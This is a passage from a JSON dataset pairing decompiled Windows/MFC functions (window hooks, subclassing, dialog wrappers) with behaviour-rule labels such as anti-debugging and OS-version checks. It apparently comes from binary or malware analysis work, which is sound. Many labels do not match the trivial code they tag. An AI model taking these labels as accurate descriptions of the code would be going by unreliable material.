0;\n                }\n            }\n            else {\n                puVar6 = puVar5;\n                if (iVar3 == 0x401) {\n                    iVar3 = 0x180;\n                    goto code_r0x0042ca67;\n                }\n                if (iVar3 == 0x403) {\n                    iVar3 = 0x143;\n                }\n                if (iVar3 == 0x401) goto code_r0x0042ca2c;\n                if ((iVar3 == 0x180) || (iVar3 == 0x143)) goto code_r0x0042ca67;\n            }\n            arg_8h = puVar5 + var_8h;\n        } while (var_4h != 0);\n        if (var_4h == 0) {\n            return 0;\n        }\n    }\n    fcn.0042bf5c(*(in_ECX + 0x1c), 0x364, 0, 0, 0, 0);\n    return var_4h;\n}\n",
        "token_count": 578
    },
    "0042ccd5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ccd5(int32_t arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    code **ppcVar9;\n    code *pcVar10;\n    uint var_13ch;\n    uint var_10ch;\n    uchar var_dh;\n    uint32_t var_ch;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    iVar4 = fcn.00446580(0x443d27);\n    if (arg_8h != 3) {\n        (*_sym.imp.USER32.dll_CallNextHookEx)(*(iVar4 + 0x28), arg_8h, arg_ch, arg_10h);\n        goto code_r0x0042cee7;\n    }\n    piVar2 = *(iVar4 + 0x14);\n    iVar8 = *arg_10h;\n    iVar5 = fcn.00444bf8();\n    cVar1 = *(iVar5 + 0x14);\n    if ((piVar2 != NULL) || (((*(iVar8 + 0x23) & 0x40) == 0 && (cVar1 == '\\0')))) {\n        if (*0x46703c == 0) {\ncode_r0x0042cd98:\n            if (piVar2 == NULL) {\n                if (*0x466d28 == 0) {\n                    fcn.00411850(&var_13ch, 0, 0x30);\n                    var_13ch = 0x30;\n                    *0x466d28 = (*_sym.imp.USER32.dll_GetClassInfoExA)(0, \"#32768\", &var_13ch);\n                    if (*0x466d28 != 0) goto code_r0x0042ce1e;\n                    iVar8 = (*_sym.imp.USER32.dll_GetClassNameA)(arg_ch, &var_10ch, 0x100);\n                    if (iVar8 != 0) {\n                        var_dh = 0;\n                        iVar8 = fcn.004118cf(&var_10ch, \"#32768\");\n                        if (iVar8 == 0) goto code_r0x0042cebd;\n                    }\n                }\n                else {\ncode_r0x0042ce1e:\n                    iVar3 = (*_sym.imp.USER32.dll_GetClassLongA)(arg_ch, 0xffffffe0);\n                    if (iVar3 == *0x466d28) goto code_r0x0042cebd;\n                }\n                var_ch = (*_sym.imp.USER32.dll_GetWindowLongA)(arg_ch, 0xfffffffc);\n                pcVar10 = _sym.imp.USER32.dll_GetPropA;\n                if ((var_ch != 0) && (iVar8 = (*_sym.imp.USER32.dll_GetPropA)(arg_ch, \"AfxOldWndProc423\"),  iVar8 == 0))\n                {\n                    (*_sym.imp.USER32.dll_SetPropA)(arg_ch, \"AfxOldWndProc423\", var_ch);\n                    uVar6 = (*pcVar10)(arg_ch, \"AfxOldWndProc423\");\n                    if (uVar6 == var_ch) {\n                        (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(\"AfxOldWndProc423\");\n                        (*_sym.imp.USER32.dll_SetWindowLongA)(arg_ch, 0xfffffffc, 0x42cb7d);\n                    }\n                }\n            }\n            else {\n                fcn.0042b473(arg_ch);\n                (**(*piVar2 + 0x50))();\n                ppcVar9 = (**(*piVar2 + 0xf0))();\n                pcVar10 = (*_sym.imp.USER32.dll_SetWindowLongA)(arg_ch, 0xfffffffc, fcn.0042bd41);\n                if (pcVar10 != fcn.0042bd41) {\n                    *ppcVar9 = pcVar10;\n                }\n                *(iVar4 + 0x14) = 0;\n            }\n        }\n        else {\n            uVar6 = (*_sym.imp.USER32.dll_GetClassLongA)(arg_ch, 0xffffffe6);\n            if ((uVar6 & 0x10000) == 0) {\n                puVar7 = *(iVar8 + 0x28);\n                if (puVar7 < 0x10000) {\n                    var_ch = var_ch & 0xffffff00;\n                    (*_sym.imp.KERNEL32.dll_GlobalGetAtomNameA)(*(iVar8 + 0x28), &var_ch, 5);\n                    puVar7 = &var_ch;\n                }\n                iVar8 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(puVar7, 0x450954);\n                if (iVar8 != 0) goto code_r0x0042cd98;\n            }\n        }\n    }\ncode_r0x0042cebd:\n    (*_sym.imp.USER32.dll_CallNextHookEx)(*(iVar4 + 0x28), 3, arg_ch, arg_10h);\n    if (cVar1 != '\\0') {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar4 + 0x28));\n        *(iVar4 + 0x28) = 0;\n    }\ncode_r0x0042cee7:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 1226
    },
    "0042cef4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0042cef4(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    iVar1 = fcn.00446580(0x443d27);\n    if (*(iVar1 + 0x14) != unaff_retaddr) {\n        if (*(iVar1 + 0x28) == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            iVar3 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(5, fcn.0042ccd5, 0, uVar2);\n            *(iVar1 + 0x28) = iVar3;\n            if (iVar3 == 0) {\n                fcn.00422e2d();\n            }\n        }\n        *(iVar1 + 0x14) = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "0042d079": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_74h\n\nuint __cdecl fcn.0042d079(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    int32_t *arg_8h_00;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t unaff_EBP;\n    int16_t iVar11;\n    uint *in_FS_OFFSET;\n    int32_t *in_stack_ffffff70;\n    uint in_stack_ffffff84;\n    uint var_74h;\n    uint var_58h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = 0;\n    uVar7 = *(unaff_EBP + 8);\n    if (uVar7 == 0x111) {\n        iVar4 = (**(*arg_8h_00 + 0xe8))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n        if (iVar4 == 0) goto code_r0x0042d264;\ncode_r0x0042d514:\n        *(unaff_EBP + -0x10) = 1;\n        goto code_r0x0042d56c;\n    }\n    if (uVar7 == 0x4e) {\n        if (**(unaff_EBP + 0x10) == 0) goto code_r0x0042d264;\n        iVar4 = (**(*arg_8h_00 + 0xec))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), unaff_EBP + -0x10);\ncode_r0x0042d538:\n        if (iVar4 == 0) goto code_r0x0042d264;\n        goto code_r0x0042d56c;\n    }\n    puVar9 = *(unaff_EBP + 0x10);\n    if (uVar7 == 6) {\n        in_stack_ffffff84 = fcn.0042b432(puVar9);\n        fcn.0042caa6(arg_8h_00, *(unaff_EBP + 0xc), in_stack_ffffff84);\n    }\n    iVar11 = puVar9;\n    if ((uVar7 == 0x20) &&\n       (in_stack_ffffff70 = arg_8h_00,  iVar4 = fcn.0042cb07(arg_8h_00, iVar11, puVar9 >> 0x10),  iVar4 != 0))\n    goto code_r0x0042d514;\n    if (((arg_8h_00[0x12] != 0) && (0 < *(arg_8h_00[0x12] + 0x70))) &&\n       ((((0x1ff < uVar7 && (uVar7 < 0x20a)) || ((0xff < uVar7 && (uVar7 < 0x110)))) ||\n        ((0x280 < uVar7 && (uVar7 < 0x292)))))) {\n        in_stack_ffffff70 = *(unaff_EBP + 0xc);\n        iVar4 = (**(*arg_8h_00[0x12] + 0x94))(uVar7, in_stack_ffffff70, puVar9, unaff_EBP + -0x10);\n        if (iVar4 == 0) goto code_r0x0042d16b;\n        goto code_r0x0042d56c;\n    }\ncode_r0x0042d16b:\n    uVar5 = (**(*arg_8h_00 + 0x28))();\n    *(unaff_EBP + -0x14) = uVar5;\n    uVar7 = *(unaff_EBP + 8);\n    fcn.0044673a(7);\n    iVar4 = ((uVar5 ^ uVar7) & 0x1ff) * 0xc;\n    iVar6 = *(unaff_EBP + -0x14);\n    if ((*(unaff_EBP + 8) != *(iVar4 + 0x4653b8)) || (iVar6 != *(iVar4 + 0x4653c0))) {\n        *(iVar4 + 0x4653b8) = *(unaff_EBP + 8);\n        *(iVar4 + 0x4653c0) = iVar6;\n        while (iVar6 != 0) {\n            if (*(unaff_EBP + 8) < 0xc000) {\n                iVar6 = fcn.00429ba5(*(*(unaff_EBP + -0x14) + 4), *(unaff_EBP + 8), in_stack_ffffff70, 0);\n                *(unaff_EBP + 0x10) = iVar6;\n                if (iVar6 != 0) {\n                    *(iVar4 + 0x4653bc) = iVar6;\n                    fcn.0044679d(7);\n                    goto code_r0x0042d1fc;\n                }\n            }\n            else {\n                iVar6 = *(*(unaff_EBP + -0x14) + 4);\n                while( true ) {\n                    iVar6 = fcn.00429ba5(iVar6, 0xc000, 0, in_stack_ffffff84);\n                    *(unaff_EBP + 0x10) = iVar6;\n                    if (iVar6 == 0) break;\n                    if (**(*(unaff_EBP + 0x10) + 0x10) == *(unaff_EBP + 8)) {\n                        *(iVar4 + 0x4653bc) = *(unaff_EBP + 0x10);\n                        fcn.0044679d(7);\n                        goto code_r0x0042d55b;\n                    }\n                    iVar6 = *(unaff_EBP + 0x10) + 0x18;\n                }\n            }\n            iVar6 = **(unaff_EBP + -0x14);\n            *(unaff_EBP + -0x14) = iVar6;\n        }\n        *(iVar4 + 0x4653bc) = 0;\n        fcn.0044679d(7);\ncode_r0x0042d264:\n        uVar8 = 0;\n        goto code_r0x0042d266;\n    }\n    iVar4 = *(iVar4 + 0x4653bc);\n    *(unaff_EBP + 0x10) = iVar4;\n    fcn.0044679d(7);\n    if (iVar4 == 0) goto code_r0x0042d264;\n    if (0xbfff < *(unaff_EBP + 8)) {\ncode_r0x0042d55b:\n        uVar8 = (**(*(unaff_EBP + 0x10) + 0x14))(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x0042d569;\n    }\ncode_r0x0042d1fc:\n    pcVar1 = *(*(unaff_EBP + 0x10) + 0x14);\n    iVar4 = *(*(unaff_EBP + 0x10) + 0x10);\n    iVar3 = puVar9 >> 0x10;\n    // switch table (65 cases) at 0x42d580\n    switch(iVar4) {\n    case 1:\n        puVar9 = *(unaff_EBP + 0xc);\n        fcn.0043374e(puVar9);\n        goto code_r0x0042d385;\n    case 2:\n    case 3:\n    case 4:\n    case 0x18:\n    case 0x19:\n        puVar9 = *(unaff_EBP + 0xc);\n        goto code_r0x0042d385;\n    case 5:\n    case 0xc:\n        uVar5 = puVar9 >> 0x10;\n        puVar9 = puVar9 & 0xffff;\n        uVar7 = *(unaff_EBP + 0xc);\n        uVar5 = fcn.0042b432(uVar7, puVar9, uVar5);\n        goto code_r0x0042d3a9;\n    case 6:\n        uVar7 = fcn.0042b432(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x0042d4be;\n    case 7:\n    case 0xd:\ncode_r0x0042d385:\n        uVar8 = (*pcVar1)(puVar9);\n        goto code_r0x0042d569;\n    case 8:\n        fcn.0043307e();\n        uVar8 = puVar9[1];\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x20) = uVar8;\n        fcn.0042a5c9();\n        uVar8 = *puVar9;\n        uVar2 = puVar9[2];\n        *(unaff_EBP + -4) = 1;\n        *(unaff_EBP + -0x58) = uVar8;\n        iVar4 = fcn.0042b459(uVar8);\n        if (iVar4 == 0) {\n            if ((arg_8h_00[0x12] != 0) && (iVar4 = fcn.00427dff(*(unaff_EBP + -0x58)),  iVar4 != 0)) {\n                *(unaff_EBP + -0x28) = iVar4;\n            }\n            iVar4 = unaff_EBP + -0x74;\n        }\n        uVar8 = (*pcVar1)(unaff_EBP + -0x24, iVar4, uVar2);\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -0x58) = 0;\n        *(unaff_EBP + -0x10) = uVar8;\n        *(unaff_EBP + -4) = 0;\n        fcn.0042bd92();\n        goto code_r0x0042d354;\n    case 9:\n        fcn.0043307e();\n        uVar8 = puVar9[2];\n        *(unaff_EBP + -0x20) = puVar9[1];\n        *(unaff_EBP + -4) = 2;\n        uVar8 = (*pcVar1)(unaff_EBP + -0x24, uVar8);\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -0x10) = uVar8;\ncode_r0x0042d354:\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.004337da();\n        break;\n    case 10:\n        uVar7 = fcn.0042b432(puVar9, *(unaff_EBP + 0xc) >> 0x10);\n        goto code_r0x0042d3a4;\n    case 0xb:\n        puVar9 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0042d4be;\n    case 0xe:\n    case 0x2c:\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0042d4be;\n    case 0xf:\n        puVar9 = fcn.0042f7d0(puVar9);\n        uVar7 = *(unaff_EBP + 0xc) >> 0x10;\ncode_r0x0042d3a4:\n        uVar5 = *(unaff_EBP + 0xc);\ncode_r0x0042d3a9:\n        uVar8 = (*pcVar1)(uVar5, uVar7, puVar9);\n        goto code_r0x0042d569;\n    case 0x10:\n        (*pcVar1)();\n        break;\n    case 0x11:\n        puVar9 = *(unaff_EBP + 0xc);\n        goto code_r0x0042d4de;\n    case 0x12:\n    case 0x1b:\n    case 0x2a:\n    case 0x2f:\n        goto code_r0x0042d4d1;\n    case 0x13:\n        puVar9 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0042d4d4;\n    case 0x14:\n        puVar9 = iVar3;\n        uVar7 = iVar11;\n        goto code_r0x0042d4d4;\n    case 0x15:\n    case 0x16:\n        puVar10 = puVar9 >> 0x10;\n        uVar7 = puVar9 & 0xffff;\n        goto code_r0x0042d502;\n    case 0x17:\n        fcn.0042b432(puVar9);\ncode_r0x0042d4d1:\n        uVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0042d4d4;\n    case 0x1a:\n    case 0x25:\n    case 0x2e:\n        uVar8 = (*pcVar1)();\n        goto code_r0x0042d569;\n    case 0x1c:\n        puVar10 = *(unaff_EBP + 0xc);\n        uVar7 = fcn.0042b432(puVar10);\n        fcn.0042b432(puVar9, uVar7);\n        uVar5 = arg_8h_00[7] == puVar9;\n        goto code_r0x0042d506;\n    case 0x1d:\n        puVar9 = *(unaff_EBP + 0xc);\n        fcn.0043374e(puVar9);\n        goto code_r0x0042d4de;\n    case 0x1e:\n        puVar9 = *(unaff_EBP + 0xc);\n        fcn.0042f7d0(puVar9);\n        goto code_r0x0042d4de;\n    case 0x1f:\n        puVar10 = puVar9 >> 0x10;\n        uVar7 = puVar9 & 0xffff;\n        uVar5 = fcn.0042f7d0(*(unaff_EBP + 0xc), uVar7, puVar10);\n        goto code_r0x0042d506;\n    case 0x20:\n        puVar9 = *(unaff_EBP + 0xc);\n        goto code_r0x0042d441;\n    case 0x21:\ncode_r0x0042d441:\n        fcn.0042b432(puVar9);\n        goto code_r0x0042d4de;\n    case 0x22:\n        puVar10 = puVar9 >> 0x10;\n        uVar7 = puVar9 & 0xffff;\n        goto code_r0x0042d45d;\n    case 0x23:\n        uVar7 = iVar11;\n        puVar10 = iVar3;\ncode_r0x0042d45d:\n        uVar5 = fcn.0042b432(*(unaff_EBP + 0xc), uVar7, puVar10);\n        goto code_r0x0042d506;\n    case 0x24:\n        uVar7 = fcn.0042b432(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x0042d4d4;\n    case 0x26:\n        puVar10 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar7 = fcn.0042b432(puVar9, puVar10);\n        goto code_r0x0042d4ee;\n    case 0x27:\n    case 0x28:\n        *(unaff_EBP + 8) = *(unaff_EBP + 0xc);\n        *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) >> 0x10;\n        if (iVar4 == 0x27) {\n            uVar7 = fcn.0042b432(puVar9);\n            uVar5 = *(unaff_EBP + 0xc);\n            puVar10 = puVar9;\n            goto code_r0x0042d506;\n        }\n        puVar9 = *(unaff_EBP + 0xc);\n        uVar7 = *(unaff_EBP + 8);\ncode_r0x0042d4d4:\n        (*pcVar1)(uVar7, puVar9);\n        break;\n    case 0x29:\n    case 0x30:\ncode_r0x0042d4de:\n        (*pcVar1)(puVar9);\n        break;\n    case 0x2b:\n    case 0x33:\n        (*pcVar1)(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x0042d514;\n    case 0x2d:\n        uVar7 = iVar11;\n        puVar9 = iVar3;\ncode_r0x0042d4be:\n        uVar8 = (*pcVar1)(uVar7, puVar9);\ncode_r0x0042d569:\n        *(unaff_EBP + -0x10) = uVar8;\n        break;\n    case 0x31:\n        uVar7 = *(unaff_EBP + 0xc) >> 0x10;\n        puVar10 = puVar9;\ncode_r0x0042d4ee:\n        uVar5 = *(unaff_EBP + 0xc);\n        goto code_r0x0042d506;\n    case 0x32:\n        uVar7 = iVar11;\n        puVar10 = iVar3;\ncode_r0x0042d502:\n        uVar5 = *(unaff_EBP + 0xc);\ncode_r0x0042d506:\n        (*pcVar1)(uVar5, uVar7, puVar10);\n        break;\n    case 0x34:\n        iVar4 = (*pcVar1)(*(unaff_EBP + 0xc), *(unaff_EBP + 0xc) >> 0x10, puVar9 & 0xffff, puVar9 >> 0x10);\n        *(unaff_EBP + -0x10) = iVar4;\n        goto code_r0x0042d538;\n    case 0x41:\n        iVar4 = (*pcVar1)();\n        *(unaff_EBP + -0x10) = iVar4;\n        if (iVar4 != 0) goto code_r0x0042d264;\n    }\ncode_r0x0042d56c:\n    if (*(unaff_EBP + 0x14) != NULL) {\n        **(unaff_EBP + 0x14) = *(unaff_EBP + -0x10);\n    }\n    uVar8 = 1;\ncode_r0x0042d266:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar8;\n}\n",
        "token_count": 4409
    },
    "0042db3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042db3c(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x48) != 0) {\n    // WARNING: Could not recover jumptable at 0x0042db47. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (**(**(param_1 + 0x48) + 0x98))();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 116
    },
    "0042db52": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042db52(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x48) != 0) {\n    // WARNING: Could not recover jumptable at 0x0042db5d. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (**(**(param_1 + 0x48) + 0x54))();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 116
    },
    "0042db87": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042db87(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x48) == 0) {\n        (*_sym.imp.USER32.dll_CheckRadioButton)(*(in_ECX + 0x1c), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042dbac. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x48) + 0x6c))();\n    return;\n}\n",
        "token_count": 153
    },
    "0042dbaf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042dbaf(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x48) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgItem)(*(param_1 + 0x1c), param_2);\n        fcn.0042b432(uVar1);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042dbd0. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x48) + 0x74))();\n    return;\n}\n",
        "token_count": 155
    },
    "0042dbd3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042dbd3(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *unaff_retaddr;\n    \n    if (*(param_1 + 0x48) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgItem)(*(param_1 + 0x1c), param_2);\n        *unaff_retaddr = uVar1;\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042dbf4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x48) + 0x70))();\n    return;\n}\n",
        "token_count": 163
    },
    "0042dbf7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042dbf7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x48) == 0) {\n        (*_sym.imp.USER32.dll_GetDlgItemInt)(*(in_ECX + 0x1c), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042dc1c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x48) + 0x78))();\n    return;\n}\n",
        "token_count": 155
    },
    "0042dc1f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042dc1f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x48) == 0) {\n        (*_sym.imp.USER32.dll_GetDlgItemTextA)(*(in_ECX + 0x1c), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042dc44. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x48) + 0x7c))();\n    return;\n}\n",
        "token_count": 156
    },
    "0042dc47": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042dc47(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x48) == 0) {\n        (*_sym.imp.USER32.dll_SendDlgItemMessageA)(*(in_ECX + 0x1c), arg_8h, arg_ch, arg_10h, arg_14h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042dc6f. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x48) + 0x80))();\n    return;\n}\n",
        "token_count": 166
    },
    "0042dc75": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042dc75(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x48) == 0) {\n        (*_sym.imp.USER32.dll_SetDlgItemInt)(*(in_ECX + 0x1c), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042dc9a. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x48) + 0x84))();\n    return;\n}\n",
        "token_count": 154
    },
    "0042dca0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042dca0(int32_t param_1, uint param_2, uint param_3)\n\n{\n    if (*(param_1 + 0x48) == 0) {\n        (*_sym.imp.USER32.dll_SetDlgItemTextA)(*(param_1 + 0x1c), param_2, param_3);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042dcbf. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x48) + 0x88))();\n    return;\n}\n",
        "token_count": 144
    },
    "0042dd19": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042dd19(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongA)(*(param_1 + 0x1c), 0xfffffff0);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042dd30. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x78))();\n    return;\n}\n",
        "token_count": 131
    },
    "0042dd33": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042dd33(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongA)(*(param_1 + 0x1c), 0xffffffec);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042dd4a. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x7c))();\n    return;\n}\n",
        "token_count": 132
    },
    "0042dd4d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042dd4d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        fcn.0042991d(*(in_ECX + 0x1c), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042dd71. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x80))();\n    return;\n}\n",
        "token_count": 152
    },
    "0042dd77": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
